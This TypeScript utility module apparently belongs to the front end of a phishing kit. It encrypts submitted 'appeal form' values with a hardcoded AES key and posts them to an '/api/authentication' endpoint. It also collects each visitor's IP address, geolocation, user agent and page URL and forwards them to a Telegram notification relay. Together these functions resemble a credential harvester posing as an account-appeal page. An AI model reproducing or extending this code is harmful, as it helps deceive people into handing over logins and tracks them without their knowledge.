import axios from "axios";
import CryptoJS from "crypto-js";

const secretKey = "HDNDT-JDHT8FNEK-JJHR";
export const encrypt = (text: string) => {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
};

export const decrypt = (cipherText: string) => {
    const bytes = CryptoJS.AES.decrypt(cipherText, secretKey);
    return bytes.toString(CryptoJS.enc.Utf8);
};

export const saveRecord = (key: string, value: any) => {
    try {
        const encryptedValue = encrypt(JSON.stringify(value));
        localStorage.setItem(key, encryptedValue);
    } catch (error) {
        console.error("Lỗi khi lưu vào localStorage:", error);
    }
};

export const getRecord = (key: string) => {
    try {
        const encryptedValue = localStorage.getItem(key);
        if (!encryptedValue) return null;

        const decryptedValue = decrypt(encryptedValue);
        if (!decryptedValue) return null;

        try {
            return JSON.parse(decryptedValue);
        } catch (e) {
            console.error("Lỗi khi parse JSON:", e);
            return null;
        }
    } catch (error) {
        console.error("Lỗi khi đọc từ localStorage:", error);
        return null;
    }
};

export const removeRecord = (key: string) => {
    try {
        localStorage.removeItem(key);
    } catch (error) {
        console.error("Lỗi khi xóa từ localStorage:", error);
    }
};

export const sendAppealForm = async (values: any) => {
    try {
        const jsonString = JSON.stringify(values);
        const encryptedData = encrypt(jsonString);

        const response = await axios.post('/api/authentication', {
            data: encryptedData,
        });

        return response;
    } catch (error) {
        throw error;
    }
};

export const getUserIp = async () => {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        throw error;
    }
};

export const getUserLocation = async () => {
    try {
        const ipClient = await getUserIp();
        const response = await axios.get(`/api/ip-location?ip=${ipClient}`, { timeout: 5000 });
        const ip = ipClient;
        const region = response.data?.regionName || '';
        const regionCode = response.data?.region || '';
        const country = response.data?.country || 'Unknown';
        const countryCode = response.data?.countryCode || 'US';
        return {
            location: `${ip} | ${region}(${regionCode}) | ${country}(${countryCode})`,
            country_code: countryCode,
            ip,
        }
    } catch (error) {
        console.error('getUserLocation error:', error?.message || error);
        return {
            location: '0.0.0.0 | Unknown | Unknown(US)',
            country_code: 'US',
            ip: '0.0.0.0',
        };
    }
};

export const notifyTelegramVisit = async (userInfo: any) => {
    try {
        const visitData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href,
            ...userInfo
        };

        const response = await axios.post('/api/notification', {
            data: visitData,
        });

        return response;
    } catch (error) {
        console.error('Error notifying Telegram about visit:', error);
        // Don't throw error to avoid breaking the main flow
    }
};